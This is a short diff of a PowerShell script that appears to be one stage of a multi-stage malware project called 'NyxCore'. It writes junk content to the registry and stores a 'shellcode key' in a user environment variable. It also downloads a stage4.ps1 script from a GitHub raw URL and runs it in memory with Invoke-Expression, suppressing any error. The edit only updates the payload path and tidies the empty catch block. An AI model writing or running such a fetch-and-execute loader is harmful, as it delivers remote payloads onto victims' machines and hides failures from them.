@@ -17,12 +17,10 @@ Set-ItemProperty -Path $regPath -Name $regName -Value $junkContent -Force
 [Environment]::SetEnvironmentVariable("NYXCOR_SHELLCODE_KEY", "NyXc0r_4dv4nc3d_M4lw4r3_2025_", "User")
 
 # Download and execute stage4.ps1 in memory
-$stage4Url = "https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/stage4.ps1"
+$stage4Url = "https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/PowerShellScripts/stage4.ps1"
 try {
     $stage4Script = (New-Object Net.WebClient).DownloadString($stage4Url)
     Invoke-Expression $stage4Script
 }
-catch {
-    # Silent fail
+catch {}
 
-}
